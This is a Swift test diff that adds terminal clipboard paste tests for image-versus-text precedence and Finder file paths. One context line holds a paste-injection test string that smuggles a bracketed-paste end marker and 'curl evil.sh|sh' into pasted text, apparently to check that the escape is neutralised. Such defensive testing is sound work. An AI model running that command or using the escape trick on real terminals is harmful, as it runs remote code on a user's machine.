@@ -63,6 +63,52 @@ struct TerminalClipboardTests {
         #expect(input == Array("\u{1b}[200~npm i foo[201~curl evil.sh|sh\r\u{1b}[201~".utf8))
     }
 
+    @Test func copiedTextWinsOverItsPictureRendition() async throws {
+        let controller = TerminalController()
+        let capture = try await TerminalTestSupport.startInputCapture(in: controller, bracketedPaste: true)
+        defer { controller.terminateAndWait() }
+        let view = try #require(controller.view as? GrokProcessTerminalView)
+        let png = try #require(
+            Data(
+                base64Encoded:
+                    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=="
+            ))
+        let pasteboard = NSPasteboard.withUniqueName()
+        defer { pasteboard.releaseGlobally() }
+        pasteboard.clearContents()
+        pasteboard.setString("A1\tB1", forType: .string)
+        pasteboard.setData(png, forType: .png)
+
+        view.paste(from: pasteboard)
+
+        let input = await TerminalTestSupport.capturedInput(capture, from: controller)
+        #expect(input == Array("\u{1b}[200~A1\tB1\u{1b}[201~".utf8))
+    }
+
+    @Test func copiedFinderFilePastesItsPathNotItsName() async throws {
+        let controller = TerminalController()
+        let capture = try await TerminalTestSupport.startInputCapture(in: controller, bracketedPaste: true)
+        defer { controller.terminateAndWait() }
+        let view = try #require(controller.view as? GrokProcessTerminalView)
+        let root = FileManager.default.temporaryDirectory.appendingPathComponent(
+            "sigil-paste-file-\(UUID().uuidString)", isDirectory: true)
+        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
+        defer { try? FileManager.default.removeItem(at: root) }
+        let file = root.appendingPathComponent("notes.txt")
+        try Data("hi".utf8).write(to: file)
+        let pasteboard = NSPasteboard.withUniqueName()
+        defer { pasteboard.releaseGlobally() }
+        pasteboard.clearContents()
+        #expect(pasteboard.writeObjects([file as NSURL]))
+        pasteboard.setString("notes.txt", forType: .string)
+
+        view.paste(from: pasteboard)
+
+        let input = await TerminalTestSupport.capturedInput(capture, from: controller)
+        let expected = "\u{1b}[200~" + TerminalDrop.pasteText(for: [file.path]) + "\u{1b}[201~"
+        #expect(input == Array(expected.utf8))
+    }
+
     @Test func clipboardGuardStillForwardsTitleUpdates() async throws {
         let controller = TerminalController()
         var title: String?
